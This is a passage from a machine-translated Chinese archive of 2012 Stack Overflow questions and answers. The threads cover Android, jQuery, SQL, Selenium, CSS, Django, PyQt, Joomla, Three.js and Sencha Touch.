       // Code to be executed
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-28T16:17:35.137

但是，您的样品对我有用；在 android 中，如果子视图处理触摸事件，那么您的父视图不会。因此，通过像上面那样注册触摸事件，如果您触摸任何子控件，则不会发生任何事情，因为子控件正在处理该事件，请参阅[Touch Listeners for Parent and Child Views](https://stackoverflow.com/questions/7387949/touch-listeners-for-parent-and-child-views)。我看到三种方法来解决这个问题：

1.  为父母和所有孩子注册代表，（但这似乎是你想要避免的......）
2.  在您的父视图类中，实现 onInterceptTouchEvent，这意味着您需要一个自定义视图类。[http://developer.android.com/reference/android/view/ViewGroup.html#onInterceptTouchEvent(android.view.MotionEvent)](http://developer.android.com/reference/android/view/ViewGroup.html#onInterceptTouchEvent(android.view.MotionEvent))
3.  SetOnTouchListener 在 M4A 中仍然存在，可以在父级和所有子级上使用，效果与选项 1 相同

# android - 操作栏中的数字，例如 Gmail

> ID：10757038
> 
> 赞同：14
> 
> 时间：2012-05-25T15:17:21.447
> 
> 标签：android, android-actionbar

我正在尝试在操作栏的右上角显示数据计数。

如果我不使用拆分操作栏，我只会在该栏中创建一个 TextView，但是当您拆分时，当前[无法](https://stackoverflow.com/questions/8571754/android-split-action-bar-with-action-items-on-the-top-and-bottom)在顶部操作栏中包含项目。

为了澄清，我的意思是：

[![Gmail 未读计数](../Images/f497f7f0a30d233e30394a872af75a06.png)](https://i.stack.imgur.com/2NzGl.png)

谷歌是否使用了不同的操作栏实现，或者有没有办法做到这一点？我想我记得读过它，但我找不到它是怎么称呼的。

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-08-30T12:04:13.207

将自定义视图与您的微调器和顶部 AB 的文本视图一起使用，并 `android:uiOptions="splitActionBarWhenNarrow"`在清单声明中为您的活动启用

```
//set the actionbar to use the custom view (can also be done with a style)
getActionBar().setDisplayOptions(ActionBar.DISPLAY_SHOW_CUSTOM);

//set the custom view to use
getActionBar().setCustomView(R.layout.custom_ab); 
```

`custom_ab.xml`ImageView、Spinner 和 TextView 的布局在哪里？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-05-14T12:15:11.540

您应该停止使用 ActionBar 或喜欢并更新您的应用程序以使用 Toolbar，它具有简单易用的界面来完成您能想到的一切。要阅读它，请使用 [Android 博客][1]

[1]：[http](http://android-developers.blogspot.in/2014/10/appcompat-v21-material-design-for-pre.html) ://android-developers.blogspot.in/2014/10/appcompat-v21-material-design-for-pre.html用于 pre lolipop 应用程序。

# jquery - 使用 jQuery 将表行从一个表复制到另一个表

> ID：10757047
> 
> 赞同：3
> 
> 时间：2012-05-25T15:18:03.587
> 
> 标签：jquery

当检查该行中的复选框时，我需要能够使用jQuery将一行从一个表复制到另一个表。

我尝试使用该`.clone()`方法，但这有非常奇怪的行为。即使 jQuery 专门针对第二个表中的行，当复制到第一个表时，它仍然可以作为目标。所以要么 clone() 不正确，要么我需要使用其他东西。

```
$('#offers tbody tr td input.checkbox:not(:checked)').click(function (e) {
    var row = $(this).closest('tr');
}); 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-25T15:22:59.883

```
$('#offers tbody tr td input.checkbox:not(:checked)').on('change', function (e) {
     var row = $(this).closest('tr').html();
     $('#otherTable tbody').append('<tr>'+row+'</tr>');
}); 
```

在行动中看到它！[http://jsfiddle.net/3BZp4/1/](http://jsfiddle.net/3BZp4/1/)

克隆也应该为您工作，并且不会影响未来的选择：

[http://jsfiddle.net/AkVTw/1/](http://jsfiddle.net/AkVTw/1/)

现在根据评论取消选中捕获：

[http://jsfiddle.net/wGGDb/](http://jsfiddle.net/wGGDb/)

# javascript - 如何将显示的当前时间保存在数据库表中

> ID：10757049
> 
> 赞同：0
> 
> 时间：2012-05-25T15:18:15.240
> 
> 标签：javascript, mysql, database, date, time

我有这个脚本用于在我的网站页面中显示当前日期和时间：

```
<script type = "text/javascript">

function startTime() {
var now = new Date();
var h=now.getHours();
var min=now.getMinutes();
var s=now.getSeconds();
var ampm=(now.getHours()>11)?"PM":"AM";
var d=now.getDay();
var y=now.getFullYear();
var mon=now.getMonth();

var endings=["st","nd","rd","th"];
var dayendings=[0,1,2,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,4,0,2,3,4,4,4,4,4,4,1];
var days=["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"];
var months=["January","February","March","April", "May", "June","July","August","September", "October", "Novemeber","Decemeber"];
if (h>12) {h-=12}
if (h==0) {h=12};
if (min<10) {min="0"+min}
if (s<10) {s="0"+s}

d=days[d+1];
mon=months[mon];
document.getElementById("time").innerHTML=d+" "+mon+" "+[now.getDate()-6]+", "+y+" "+h+":"+min+":"+s+" "+ampm;
var tim = setTimeout("startTime()",1000);
}
</script> 
```

然后，我有一个文本区域，用户必须在其中输入他或她的学号。单击提交按钮后，当前日期和时间应保存在数据库中。它实际上是用于用户的时间和时间。

如何正确执行？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T15:20:17.483

不要相信客户端的时间值。绝对不能保证用户的时钟是准确的，或者不是故意错误设置的。

如果您需要记录“当前时间”，请使用类似

```
INSERT INTO yourtable (timefield) VALUES (now())
                                          ^^^^^ 
```

插入一个（据说）更值得信赖的时间戳。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T15:23:23.787

我同意马克的观点。除了，`NOW()`依赖于您的服务器的本地时间，而`UTC_TIMESTAMP()`将选择唯一的 UTC 时间独立位置，因此时间偏移。

# oracle - Oracle：按数字名称选择（七 -> 7）

> ID：10757054
> 
> 赞同：1
> 
> 时间：2012-05-25T15:18:31.433
> 
> 标签：oracle, select, text, numbers

简单的问题：有没有办法通过数字名称选择包含数字的行？我的意思是我在查询中输入“七”，然后得到包含“7”的行。我也需要这个来做序数：我输入'second'，然后得到带有'2'的行。

我一直在查看 Oracle Text，但找不到任何可以做到这一点的东西。

谢谢！

——拉帕

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-25T15:37:21.347

```
select to_char(to_date(1,'J'),'Jsp') from dual; 
```

HTH。

亚历山德罗

PS：@Mike：`select to_char(to_date(483922,'J'),'Jsp') from dual`也可以；）

PPS：忘了说：`select to_char(to_date(1,'J'),'Jspth') from dual;`

# inno-setup - 如果安装程序打开，如何使 Innosetup 卸载程序不运行？

> ID：10757060
> 
> 赞同：2
> 
> 时间：2012-05-25T15:18:39.403
> 
> 标签：inno-setup, istool

如果安装程序正在通过 Innosetup 构建并且当前正在安装（安装程序和卸载程序由同一源文件制作），如何使通过 Innosetup 卸载程序创建的不运行？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-28T09:31:32.483

如果`AppMutex`尚未对此进行保护，您可以在安装和卸载中添加代码以使用`CheckForMutexes()`和`CreateMutex()`. 如果`CheckForMutexes()`返回true，则可以退出。这将基本上取代`AppMutex`支持，也可以检查您的应用程序。

# python - 告诉我为什么这不会导致超时错误（selenium 2 webdriver）？

> ID：10757061
> 
> 赞同：7
> 
> 时间：2012-05-25T15:18:50.497
> 
> 标签：python, selenium, webdriver, selenium-webdriver

```
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait

browser = webdriver.Firefox()

browser.get("http://testsite.com")

element = WebDriverWait(browser, 10).until(lambda browser : browser.find_element_by_id("element"))

element.click() # it actually goes to page http://testsite.com/test-page.html

print "Just clicked! And I'm expecting timeout error!"

new_element = WebDriverWait(browser, 0.1).until(lambda browser : browser.find_element_by_id("element"))

print "Too bad there's no timeout error, why?!" 
```

好的，正如您所看到的，即使我将等待时间设置为 0.1 秒，仍然没有抛出超时异常。执行时`element.click()`它不会阻塞，直到整个页面加载，这就是`Just clicked! And I'm expecting timeout error!`出现的原因，令我惊讶`new_element = WebDriverWait(browser, 0.1).until(lambda browser : browser.find_element_by_id("element"))`的是等到整个页面加载。如果你使用`implicit waits`，你会得到相同的结果。

我的观点是，有时在您单击一个元素后，由于代理错误，页面加载可能需要几个小时，而且您显然**不想**等待那么久，您想要的是超时异常。在这种情况下，您将如何使其工作？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-25T15:26:56.463

单击具有内置的隐式等待，以等待页面加载。目前仅在 FirefoxDriver 中完成的工作允许您设置 Selenium 等待页面加载的时间。

这可能会在 Python 的 Selenium 2.22 中，然后一旦设置，您的测试用例可能会失败

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-26T10:00:39.097

webdriver wait 上的 Until 方法在您指定的时间段内忽略在您指定的条件下发生的元素未找到异常和其他异常。在给定的时间之后，如果您不存在该元素，您最初会得到一个 no such element 异常，然后如果您处理“no such element”异常（最好是在 try catch 中），则会出现超时异常。

根据您的需要，您可以尝试以这种方式解决 -

-> 将焦点放在加载页面后的按钮上 -> 使用 java 代码触发点击（不是 webdriver。因为点击将等待下一页加载。） -> 放置一个 thread.sleep 秒或二 -> 检查元素的存在。

# css - div在调整大小时改变位置

> ID：10757062
> 
> 赞同：0
> 
> 时间：2012-05-25T15:18:53.600
> 
> 标签：css, layout, window-resize

当我重新调整浏览器窗口的大小时，右浮动 div 在同一包含 div 的左浮动 div 下方移动。在我重新调整窗口大小之前，一切看起来都很正常。

其中 c1 是父级，c1a 是左 div，而 c1b 是右 div。

```
#c1 {
    margin-top: 50px;

}
#c1a {
    display: inline-block;
    margin-left: 30px;
    background-color: #FFF;
    padding: 5px;
    float: left;
}

#c1b {
    font-family: Arial, Helvetica, sans-serif;
    color: #000;
    width: 180px;
    font-size: x-small;
    background-color: #CCC;
    float: right;
    margin-right: 200px;
    padding-top: 8px;
    padding-right: 8px;
    padding-bottom: 12px;
    padding-left: 12px;
} 
```

我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-25T15:37:55.930

当建筑物的基础坚固时，房间也坚固。您正试图在水上建造房屋。通过给定宽度来使您的基础容器坚固。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T15:31:38.347

当您调整外部容器的大小时，如果右 div 与左 div 重叠，它将下降到下一行。您可以做的几件事..在父级上设置宽度，使其不会调整大小或设置最小宽度以防止其缩小到一定大小以下。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-25T15:35:27.960

将父 div 的最小宽度设置为大于子 div 的总宽度和边距。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-25T15:54:43.937

给你的 #c1 div 一个 440px 的最小宽度 - 这是一个演示的小提琴：http: [//jsfiddle.net/G6HUy/](http://jsfiddle.net/G6HUy/)

# python - Django模板中的辅助键

> ID：10757063
> 
> 赞同：1
> 
> 时间：2012-05-25T15:18:56.687
> 
> 标签：python, django, google-app-engine

我将公司信息和类别信息传递给 Django 模板页面，我想从 Company.companycategory 中获取一个值，并在另一个模型 CompanyCategory 中查找此 ID，该模型返回一个人类可读的字符串。有没有办法在模板中做到这一点？

```
{% for company in company_list %}
    <tr>
    <td>{{company.companyname}}</td> <td>{{company.companypostcode}}</td> <td>{{company.key.id}}</td> 
    </tr>
    </div>
{% endfor %} 
```

所以 company.key.id 是我可以用来从 CompanyCategory 模型中查找记录的 id，我正在发送一个类别列表。所以我想我唯一的选择是循环遍历所有类别以寻找匹配项？还是有更好的方法来做到这一点？

以下是要求的模型：

```
class CompanyCategory(db.Model):
    categoryname = db.StringProperty(required=False)

    def __unicode__(self):
            return u'%s' % (self.categoryname)

class Company(db.Model):
    companyurl = db.StringProperty(required=False)
    companyname = db.StringProperty(required=False)
    companydesc = db.TextProperty(required=False)
    companyaddress = db.PostalAddressProperty(required=False)
    companypostcode = db.StringProperty(required=False)
    companyemail = db.EmailProperty(required=False)
    companycountry = db.StringProperty(required=False)
    companyvalid = db.BooleanProperty()
    companyentrytime = db.DateTimeProperty(auto_now_add=True)
    companylatlong = db.GeoPtProperty()
    companycategory = db.ReferenceProperty(CompanyCategory, collection_name='compcategory') 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T15:30:05.060

如果您使用的是 vanilla django，您的模型似乎足够相关，可以保证建立`ForeignKey`关系，在这种情况下，您可以通过类似的方式访问公司类别`company.companycategory.name`

看来这`ReferenceProperty`将为您在 appengine 上提供类似的功能。 [https://developers.google.com/appengine/docs/python/datastore/typesandpropertyclasses#ReferenceProperty](https://developers.google.com/appengine/docs/python/datastore/typesandpropertyclasses#ReferenceProperty) 允许每个公司引用一个类别并将其作为属性提供。

如果您无法创建参考属性，那么我相信您只需在视图中为每家公司查找相应的类别，或者您可以在模型上创建一个方法来为您获取这些数据，特别是因为这看起来像这可能是一个常见的操作。使用装饰方法`@property`应该允许您在模板中访问它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-28T15:14:21.750

在@dm03514 的帮助下，我可以访问实际值和文本，而无需使用进一步查找`{{company.companycategory.categoryname}}`

# html - 倾斜导航

> ID：10757066
> 
> 赞同：2
> 
> 时间：2012-05-25T15:19:00.853
> 
> 标签：html, navigation

我正在尝试制作一个带有倾斜形状的导航菜单，如下图所示。有人可以就创建这个的最佳方式给我任何意见吗？

任何帮助将不胜感激！

![倾斜导航](../Images/2f22911986560d3f99a3b59a6d158d2d.png)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-25T15:21:09.217

最好的方法是使用伪元素在边缘创建三角形。

查看小提琴：http: [//jsfiddle.net/HRWqq/](http://jsfiddle.net/HRWqq/)

**HTML：**

```
<ul>
    <li><a href="#">Some Text</a></li>
    <li><a href="#">Some Text</a></li>
    <li><a href="#">Some Text</a></li>
    <li><a href="#">Some Text</a></li>
    <li><a href="#">Some Text</a></li>
</ul>​ 
```

**CSS：**

```
li {
    float: left;
    background: #ccc;
    margin-right: 50px;
}
li > a {
    text-decoration: none;
    display: block;
    position: relative;
    line-height: 40px;
    padding: 0 8px;
}
li > a:before {
    content: '';
    position: absolute;
    border: 20px solid #ccc;
    border-left-color: transparent;
    border-top-color: transparent;
    right: 100%;
    top: 0;
}
li > a:after {
    content: '';
    position: absolute;
    border: 20px solid #ccc;
    border-right-color: transparent;
    border-bottom-color: transparent;
    left: 100%;
    top: 0;
}

li:first-child > a {
    background: #aaa;
}
li:first-child > a:after {
    border-top-color: #aaa;
    border-left-color: #aaa;
}

li:last-child > a {
    background: #ddd;
}
li:last-child > a:before{
    border-right-color: #ddd;
    border-bottom-color: #ddd;
}
li:last-child > a:after {
    border: 0;
} 
```

​</p>

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T15:21:48.637

使用图像映射。[http://en.wikipedia.org/wiki/Image_map](http://en.wikipedia.org/wiki/Image_map)

# java - 从 xml 文件读取的本地化菜单

> ID：10757068
> 
> 赞同：2
> 
> 时间：2012-05-25T15:19:11.150
> 
> 标签：java, xml, xslt, localization, menu

我有下一个问题。对于我在 java 上的 web 应用程序，我使用 2 种变体的 Tutor 和 Student 菜单。之后，根据登录用户的角色，我将 xml 文件转换为 html 并包含在页面中。这意味着我应该使用 4 个 xml 文件和 4 个 html 文件（如果我想使用本地化 2 个语言环境和多线程应用程序），获取当前语言环境并选择文件源和结果进行转换，还是存在其他方式来做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-26T08:41:15.747

如果我理解正确，您有 2 种不同的视图，每种视图都有 2 种可能的语言：

*   查看（页面）导师
    *   用英语讲
    *   第二语言
*   学生视图
    *   用英语讲
    *   第二语言

据我所知，没有标准的实用程序可以为同一页面定义不同的视图（在您的情况下，对于导师和学生），因为它将在很大程度上取决于应用程序。所以你可以使用任何方法。您使用不同 XML 源的方法听起来不错。

至于语言环境，标准方法是使用[Java Resource Bundles](http://java.sun.com/developer/technicalArticles/Intl/ResourceBundles/)。还有其他用于国际化的实用程序，例如[cosmopolitan](https://github.com/rodionmoiseev/c10n/wiki/Overview)等。使用它可以为您提供将 XML 文件与语言翻译分离的优势，因此您只需要 2 个 XML 文件。这也意味着，如果您将 XML 文件更改为英语，则无需将 XML 文件中的相同更改为第二语言。

但是，您需要避免在 XML 文件中存储可本地化的文本，而是存储用于获取当前语言环境的正确文本的特殊*键。*

例如：

```
<page>
  <title>${title}</title>
  <body>
    <heading>${heading}</heading>

    ${introduction}

    Copyright (c) 2012
  </body>
</page> 
```

然后，您可以在例如属性文件中定义可本地化部分（例如`${title}`, ）的翻译：`${heading}`

```
#In Translations_en.properties file
title=Page for tutors
heading=Introduction
introduction=Welcome to the tutors page!

#In Translations_<yourlanguage>.properties file
title=...
heading=...
introduction=... 
```

然后修改您的 XML -> HTML 转换过程以提取 for 中的键`${key}`并将它们替换为基于当前语言环境的*.properties文件之一的值。*

**编辑：**

你可以试试这个：

1) 从您的 XML 模板开始（让我们稍微简化一下）：

```
<!-- tutor.xml -->
<page>
  <title>${title}</title>
</page> 
```

2) 创建并应用预处理器，将您的模板转换为每种语言的本地化模板。输出应如下所示：

```
<!-- tutor_en.xml -->
<page>
  <title>Title</title>
</page>

<!-- tutor_ru.xml -->
<page>
  <title>Название</title>
</page> 
```

3) 在运行时转换和加载适当的模板。大致而言，您的代码将如下所示：

```
// Get xml template name based on current locale
String getLocalisedTemplate(String baseName){
  return baseName + "_" + Locale.getDefault().getLanguage() + ".xml";
}

public String renderPage(){
  if(currentUser.isTutor()){
    //This will be tutor_en.xml or tutor_ru.xml
    String templateFile = getLocalisedTemplate("tutor");

    //Return localised and transformed HTML
    return applyXslt("tutor.xslt", templateFile);
  } else if (currentUser.isStudent()){
    // same as above replacing tutor with student
  }
} 
```

我用于`Locale.getDefault()`说明目的，在您的应用程序中，您可能会有不同的方式来确定当前用户区域设置（可能来自用户设置）。

本质上，上述方法与您最初的建议非常相似。唯一的区别是，本地化的 XML 文件是在步骤 2 中从 XML 模板自动生成的，因此您不必手动管理它们。

对于用户同时使用，用户的观点不应该有冲突。这将取决于您如何部署界面：桌面 Java 应用程序、小程序、基于 Web 的应用程序等。无论您采用哪种方法，每个用户都应该拥有自己的 JVM 实例或会话，解耦来自其他用户。

# tsql - 连接列具有多个值时忽略列

> ID：10757075
> 
> 赞同：1
> 
> 时间：2012-05-25T15:20:04.303
> 
> 标签：tsql, join, count

我有一个表 Orgs，其中包含以下数据：

```
ID   Name            AddressID
0    McDonalds          4
1    Starbucks          5
2    Burger King        7 
```

我还有一个地址表，其中包含以下数据：

```
ID   OrgID   Address
3     0      123 Main St.
4     0      456 East Ave.
5     1      789 Young St.
6     2      5 Riverside Dr.
7     2      8 Lakeview Ave. 
```

我需要创建一个 select 语句，从 Orgs 表中选择公司名称及其地址。Orgs 表中的公司可以有 1 个或多个地址。如果公司只有一个地址，我不想返回该公司的任何地址。如果公司有多个地址，我想返回 Orgs.AddressID = Addresses.ID 的地址

所以我的结果应该是这样的：

```
ID   Name         Address
0    McDonalds    456 East Ave.
1    Starbucks
2    Burger King  8 Lakeview Ave. 
```

我不知道该怎么做。谢谢你的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T15:30:13.033

```
SELECT 
    O.ID, O.Name, A.Address
FROM 
    Orgs O
LEFT OUTER JOIN 
    (SELECT OrgID FROM Addresses GROUP BY OrgID HAVING COUNT(*) > 1) X ON O.ID = X.OrgID
LEFT OUTER JOIN 
    Addresses A ON X.OrgID = A.OrgID AND O.AddressID = A.ID 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T15:33:30.940

[SQL 摆弄一个工作演示](http://sqlfiddle.com/#!3/49e84/10)

```
SELECT O.ID, O.Name, IsNull(A.addr, '') as Address
FROM Org O
LEFT JOIN 
(
  SELECT OrgID 
  FROM Address 
  GROUP BY OrgID 
  HAVING COUNT(*) > 1
) c 
  ON O.ID = c.OrgID
LEFT JOIN Address A 
  ON c.OrgID = A.OrgID 
  AND O.AddressID = A.ID 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-25T15:31:17.803

没有数据本身很难，但是像这样？

```
SELECT 
    orgs.OrgID
,   orgs.Name
,   CASE 
        WHEN OrgCount > 1 THEN ad.Address
        ELSE '' 
    END AS Address
FROM        
(
    SELECT 
        OrgID
    ,   Name
    ,   COUNT(*) AS OrgCount
    FROM 
    Orgs
) orgs
INNER JOIN 
Addresses ad
    ON 
    ad.AddressID = orgs.AddressID 
GROUP BY 
    orgs.OrgID
,   orgs.Name
,   CASE 
        WHEN OrgCount > 1 THEN ad.Address
        ELSE '' 
    END AS Address 
```

# class - pyqt-如何为 QLabel 类创建点击信号？

> ID：10757077
> 
> 赞同：2
> 
> 时间：2012-05-25T15:20:12.613
> 
> 标签：class, button, pyqt, signals, qlabel

我从 QLabel 创建了一个图像按钮类。现在我想添加一个点击信号。现在，该怎么办？

```
 class PicButton(QLabel):

    def __init__(self,pixmap1,pixmap2,parent=None):
        QLabel.__init__(self, parent) 
        self.pic = pixmap1
        imageSize = self.pic.size()
        imageSize.setWidth(imageSize.width()*.7)
        imageSize.setHeight(imageSize.height()*.7)
        self.pic = self.pic.scaled(imageSize,Qt.KeepAspectRatioByExpanding)

        self.pic2 = pixmap2
        imageSize2 = self.pic2.size()
        imageSize2.setWidth(imageSize2.width()*.7)
        imageSize2.setHeight(imageSize2.height()*.7)
        self.pic2 = self.pic2.scaled(imageSize2,Qt.KeepAspectRatioByExpanding)

    def enterEvent(self, event):
        self.setPixmap(self.pic2)
        event.accept()

    def leaveEvent(self, event):
        """ When the mouse leave this widget, destroy it. """
        self.setPixmap(self.pic)
        self.destroy() 
```

我做一个按钮：

```
 ImageButton2 = PicButton(QPixmap("image/buy.png"),QPixmap("image/buy_Hover.png"))
  ImageButton2.clicked.connect(self.addStuff)  # but this class has not  clicked signal 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-25T21:26:39.010

QLabels 没有默认`clicked`信号。如果你想拥有一个，你必须自己[添加它](http://pyqt.sourceforge.net/Docs/PyQt4/new_style_signals_slots.html#defining-new-signals-with-pyqtsignal)并在正确的事件上发出它。

要检测事件，您可以：

*   覆盖[一个或多个](http://qt-project.org/doc/qlabel.html#mousePressEvent)
    *   QLabel.mouseDoubleClickEvent
    *   QLabel.mousePressEvent
    *   QLabel.mouseReleaseEvent
*   [安装](http://qt-project.org/doc/qobject.html#installEventFilter)事件[过滤器](http://qt-project.org/doc/eventsandfilters.html#event-filters)
*   覆盖 QLabel。[事件](http://qt-project.org/doc/qlabel.html#event)

# asp.net - 堆积柱形图不显示

> ID：10757078
> 
> 赞同：0
> 
> 时间：2012-05-25T15:20:13.117
> 
> 标签：asp.net, mschart

我创建了图表。在设计视图中，它显示了，但是当我运行程序时，什么都没有显示。

```
 <asp:Chart ID="Chart4" runat="server">
    <Series>
        <asp:Series Name="Series1">
        </asp:Series>
    </Series>
    <ChartAreas>
        <asp:ChartArea Name="ChartArea1">
        </asp:ChartArea>
    </ChartAreas>
</asp:Chart> 
```

# iphone - 在 XCode 4.3.2 中添加资源的问题

> ID：10757080
> 
> 赞同：0
> 
> 时间：2012-05-25T15:20:22.927
> 
> 标签：iphone, ios5, xcode4, xcode4.3

在我的 iPhone 项目中，我想添加一个新的资源文件夹。可以说根文件夹名称是“主题”，其中我有两个文件夹，例如“黑色”和“蓝色”。

我正在添加这个“主题”文件夹，其中包含“将项目复制到目标组文件夹”和“为任何添加的文件夹创建文件夹引用”选项，因为我想在应用程序中维护上述文件夹结构（最终的 .app 文件夹）。所以在 XCode 中，这表示为“蓝色”颜色的文件夹。

但是在我这样做之后，XCode 构建被“附加到 ProjectName”挂起。在我再次删除“主题”文件夹后，它工作正常。

我尝试了干净的构建，重置模拟器并重新开始选项。但仍然是同样的问题。

感谢您的帮助。这正在消磨我两天的时间。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-29T16:55:35.197

实际上，我偶然找到了解决方案。我试图添加名为“资源”的文件夹。出于某种原因，当名称为“资源”时，会发生此奇怪的错误。当我重命名文件夹时，它工作正常。这可能是 XCode 4.3.2 中的一个错误。

注意：在早期的 XCode 版本中，当我们创建一个新项目时，默认情况下会有一个名为“Resources”的文件夹。但不是在新的 XCode 版本中。尽管在 Xcode 项目中没有像这样的可见文件夹，但出于某些目的，这可能是 Apple 的保留名称。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T16:16:52.187

这是一个奇怪的！当我通常收到此错误时，我会关闭/关闭模拟器和 xCode，然后再次重新启动 xCode。试试看它是否能解决问题。

# joomla1.7 - 如何在 joomla 文章中将数据插入数据库

> ID：10757084
> 
> 赞同：2
> 
> 时间：2012-05-25T15:21:01.853
> 
> 标签：joomla1.7

我是 joomla 开发的初学者。我知道 PHP，MySql。但我想在 joomla 中将数据插入数据库（phpmyadmin）。如何在 joomla 文章中做到这一点。谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T16:01:49.900

您可以通过这种方式在 joomla 中运行插入查询。

```
 $db =& JFactory::getDBO();
    $query = "INSERT INTO '#__example_table' ('name','email','username')
            VALUES ('John Smith','johnsmith@domain.example','johnsmith')";
    $db->setQuery($query);
    $db->query(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-04-16T16:21:18.017

另一种插入查询的方式。

```
$db = JFactory::getDBO();

$query = $db->getQuery(true); 
```

将列名作为数组获取到变量。

```
$columns = array('fieldname1','fieldname2');
$values = array(1,$db->quote('my value'),$db->quote('my message'); 
```

插入查询

```
$query->insert($db->quoteName('#__tablename'))
      ->columns($db->quoteName($columns)
      ->values(implode(',',$values)); 
```

设置查询

```
$db->setQuery($query);
$db->execute(); 
```

# three.js - 如何向 Three.js 添加新类型的可渲染对象？

> ID：10757085
> 
> 赞同：0
> 
> 时间：2012-05-25T15:21:02.160
> 
> 标签：three.js

具体我需要

1.  交错数据。

    我需要我的各种属性大部分都在交错的同一个缓冲区中，而不是在单独的缓冲区中，因为我将一起更新大多数属性。理想情况下，我会有一个带有attribute1 的缓冲区和另一个带有attribute2、attribute3、attribute4、attribute5、交错的缓冲区。

2.  仅部分更新缓冲区的能力。

    我对当前 Three.JS 代码的理解是，如果我更新顶点数据，它会上传所有数据，但我只想更新一小部分。假设我可以让 Three.JS 做 #1 并告诉我它在哪里制作缓冲区，我可以自己管理这个。或者，如果我可以自己制作缓冲区并告诉 Three.js 如何使用它们。

3.  100% 自定义属性。

    我的所有属性都不是标准的。没有位置、法线、紫外线，这一切都很特别。这意味着例如 THREE.js 将无法查看我的数据来找出质心或边界框。如果它需要这些数据，我需要提供它。

如果有一个已经这样做的例子，请指出我。虽然我没有看到示例文件夹，但查​​看了示例文件夹。通过 three.js 代码的 grep 没有调用任何带有自定义偏移量的 vertexAttribPointer。这是我必须添加的东西吗？

# sencha-touch - 选项卡面板中的 Vbox 布局问题

> ID：10757088
> 
> 赞同：4
> 
> 时间：2012-05-25T15:21:15.223
> 
> 标签：sencha-touch, sencha-touch-2

我的`vbox`布局有问题，所以我创建了一个简单的例子来说明这个问题，就是让我的`vbox`布局达到`fit` 屏幕的高度。

在`hbox`屏幕上，视图看起来像预期的那样。

![在此处输入图像描述](../Images/905a01e87832b129378c424638fcc0e0.png)

* * *

但是，当我简单地更改`hbox`为`vbox`左上角的所有文本覆盖时。

![在此处输入图像描述](../Images/2e439e14943438348f135e9ee54d6b92.png)

* * *

所有代码都在下面给出，它在[Sencha Fiddle](http://www.senchafiddle.com/#cxuMl)

* * *

> 应用程序.js

```
Ext.Loader.setConfig({
    enabled: true
});

Ext.application({
    name: 'SenchaFiddle',

    views: ['MainView', 'HboxView', 'VboxView'],

    launch: function() {
        Ext.Viewport.add(Ext.create('SenchaFiddle.view.MainView'));

    }
}); 
```

* * *

> MainView.js

```
Ext.define("SenchaFiddle.view.MainView", {
    extend: 'Ext.tab.Panel',
    requires: [
        'Ext.TitleBar'
    ],
    config: {
        tabBarPosition: 'bottom',
        items: [{
            title: 'hbox',
            iconCls: 'action',

            items: [{
                docked: 'top',
                xtype: 'titlebar',
                title: 'Hbox'
            }, {
                xtype: 'hbox-view'
            }]
        }, {
            title: 'vbox',
            iconCls: 'action',
            items: [{
                docked: 'top',
                xtype: 'titlebar',
                title: 'Vbox'
            }, {
                xtype: 'vbox-view'
            }]
        }]
    }
}); 
```

* * *

> HboxView.js

```
Ext.define("SenchaFiddle.view.HboxView", {
    extend: 'Ext.Container',
    xtype: 'hbox-view',
    config: {
        style: 'background-color: #0f0',
        layout: 'hbox',
        items: [{
            xtype: 'panel',
            html: 'baz',
            style: 'background-color: #ff0',
            flex: 1
        }, {
            xtype: 'panel',
            html: 'foo',
            style: 'background-color: #f00',
            flex: 2
        }, {
            xtype: 'panel',
            html: 'bar',
            style: 'background-color: #fff',
            flex: 3
        }]
    }
}); 
```

* * *

> VboxView.js

```
Ext.define("SenchaFiddle.view.VboxView", {
    extend: 'Ext.Container',
    xtype: 'vbox-view',
    config: {
        style: 'background-color: #0f0',
        layout: 'vbox',

        items: [{
            xtype: 'panel',
            html: 'baz',
            style: 'background-color: #ff0',
            flex: 1
        }, {
            xtype: 'panel',
            html: 'foo',
            style: 'background-color: #f00',
            flex: 2
        }, {
            xtype: 'panel',
            html: 'bar',
            style: 'background-color: #fff',
            flex: 3
        }]
    }
}); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-26T07:06:24.790

问题出在 MainView.js 结构中。您的 vbox 包装容器没有布局：

```
{
  title: 'vbox',
  iconCls: 'action',
  layout: card, // or fit, etc. :)
  items: [
    {
      docked: 'top',
      xtype: 'titlebar',
      title: 'Vbox'
    },
    {
      xtype: 'vbox-view'
    }
  ]
}, 
```

但这不是很好的代码。最好在 VBoxView 和 HboxView 定义中添加标题栏和一些配置：

```
 Ext.define("SenchaFiddle.view.VboxView", {
        extend: 'Ext.Container',
        xtype: 'vbox-view',
        config: {
            style: 'background-color: #0f0',
            layout: 'vbox',
